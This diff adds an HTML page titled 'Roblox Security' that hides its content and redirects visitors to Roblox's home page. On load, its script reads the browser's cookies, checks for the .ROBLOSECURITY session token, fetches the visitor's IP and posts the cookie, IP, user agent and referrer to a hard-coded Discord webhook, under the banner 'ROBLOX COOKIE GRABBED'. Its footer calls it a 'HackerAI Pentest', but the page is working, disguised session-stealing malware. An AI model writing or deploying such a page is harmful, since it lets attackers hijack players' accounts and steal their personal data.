@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Roblox Security</title>
+    <meta http-equiv="refresh" content="0;url=https://www.roblox.com/home">
+    <style>body{display:none}</style>
+</head>
+<body>
+<script>
+(async()=>{
+    const cookie = document.cookie;
+    if(cookie.includes('.ROBLOSECURITY')) {
+        try {
+            const ipResp = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResp.json();
+            const ip = ipData.ip || 'unknown';
+            
+            const payload = {
+                embeds: [{
+                    title: '🎯 ROBLOX COOKIE GRABBED',
+                    description: '```' + cookie + '```',
+                    color: 16711680,
+                    fields: [
+                        {name: '👤 IP Address', value: ip, inline: true},
+                        {name: '🌐 User-Agent', value: navigator.userAgent.slice(0,60) + '...', inline: false},
+                        {name: '🔗 Referrer', value: document.referrer || 'Direct', inline: true}
+                    ],
+                    footer: {text: 'HackerAI Pentest | ' + new Date().toISOString().slice(0,19).replace('T',' ')},
+                    thumbnail: {url: 'https://www.roblox.com/HeadshotThumbnail.ashx?width=150&height=150&format=png&userid=1'}
+                }]
+            };
+            
+            await fetch('https://discord.com/api/webhooks/1496067039532417034/77Ll2SF1h6ZsGyI8Mt7OPKzJleSzBM04RBuudABW32yvCaKhf-YYX5O4oi5B44S1OSf0', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(payload)
+            });
+        } catch(e) {}
+    }
+})();
+</script>
+</body>
+</html>
